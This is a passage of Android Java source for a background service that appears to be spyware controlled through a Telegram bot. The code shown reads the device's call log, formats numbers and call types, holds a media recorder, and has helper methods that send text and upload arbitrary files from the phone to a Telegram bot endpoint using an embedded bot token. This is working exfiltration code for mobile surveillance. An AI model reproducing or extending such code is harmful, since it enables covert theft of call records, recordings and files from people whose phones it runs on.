if (cursor != null) {
                while (cursor.moveToNext()) {
                    String type = "Unknown";
                    int t = cursor.getInt(1);
                    if (t == CallLog.Calls.INCOMING_TYPE) type = "📥 Incoming";
                    else if (t == CallLog.Calls.OUTGOING_TYPE) type = "📤 Outgoing";
                    else if (t == CallLog.Calls.MISSED_TYPE) type = "❌ Missed";

                    sb.append("📞 Number: ").append(cursor.getString(0))
                      .append("\n📊 Type: ").append(type)
                      .append("\n────────────────────\n");
                }
                cursor.close();
            }
        } catch (Exception e) {
            sb.append("❌ Error: ").append(e.getMessage());
        }
        return sb.toString();
    }

    private void triggerVibration(long duration) {
        Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE));
            } else {
                v.vibrate(duration);
            }
        }
    }

    private void showNotification(String title, String message) {
        String channelId = "telegram_bot_channel";
        NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(channelId, "Bot Notifications", NotificationManager.IMPORTANCE_HIGH);
            notificationManager.createNotificationChannel(channel);
        }

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, channelId);
        } else {
            builder = new Notification.Builder(this);
        }

        builder.setSmallIcon(android.R.drawable.ic_menu_mylocation)
               .setContentTitle(title)
               .setContentText(message)
               .setAutoCancel(true);

        notificationManager.notify((int) System.currentTimeMillis(), builder.build());
    }

    private String toSmallCaps(String text) {
        if (text == null) return "";
        char[] lower = {'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'};
        char[] smallCaps = {'ᴀ', 'ʙ', 'ᴄ', 'ᴅ', 'ᴇ', 'ғ', 'ɢ', 'ʜ', 'ɪ', 'ᴊ', 'ᴋ', 'ʟ', 'ᴍ', 'ɴ', 'ᴏ', 'ᴘ', 'ǫ', 'ʀ', 's', 'ᴛ', 'ᴜ', 'ᴠ', 'ᴡ', 'x', 'ʏ', 'ᴢ'};
        
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < text.length(); i++) {
            char c = text.charAt(i);
            char lowerC = Character.toLowerCase(c);
            int idx = -1;
            for (int j = 0; j < lower.length; j++) {
                if (lower[j] == lowerC) {
                    idx = j;
                    break;
                }
            }
            if (idx != -1) {
                sb.append(smallCaps[idx]);
            } else {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    private void sendTelegramMessage(String chatId, String message) {
        try {
            String formattedMessage = toSmallCaps(message);
            String encodedMessage = URLEncoder.encode(formattedMessage, "UTF-8");
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + chatId + "&text=" + encodedMessage;
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            conn.getInputStream().close();
        } catch (Exception e) {
            Log.e("SmsService", "Error sending TG message", e);
        }
    }

    private void sendTelegramFile(String chatId, String filePath, String apiMethod, String fileField) {
        try {
            File uploadFile = new File(filePath);
            String boundary = "*" + System.currentTimeMillis() + "*";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/" + apiMethod);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd);
            dos.writeBytes(chatId + lineEnd);

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"" + fileField + "\";filename=\"" + uploadFile.getName() + "\"" + lineEnd);
            dos.writeBytes("Content-Type: application/octet-stream" + lineEnd + lineEnd);

            FileInputStream fileInputStream = new FileInputStream(uploadFile);
            byte[] buffer = new byte[1024];
            int bytesRead;
            while ((bytesRead = fileInputStream.read(buffer)) != -1) {
                dos.write(buffer, 0, bytesRead);
            }
            fileInputStream.close();

            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            while (reader.readLine() != null) {}
            reader.close();
        } catch (Exception e) {
            Log.e("MyService", "Error sending file to TG", e);
        }
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (mediaRecorder != null) {
            try {
                mediaRecorder.release();
            } catch (Exception ignored) {}
        }
        super.onDestroy();
    }
}
